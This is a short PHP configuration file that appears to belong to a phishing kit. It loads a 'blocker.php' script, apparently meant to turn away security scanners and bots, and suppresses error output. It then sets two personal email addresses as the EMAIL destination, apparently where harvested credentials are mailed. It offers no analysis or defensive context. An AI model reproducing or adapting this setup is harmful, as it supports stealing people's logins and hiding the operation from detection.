<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "jamesmoris131@gmail.com,jamesmoris131@hotmail.com";
define("EMAIL", "$ur_email");
?>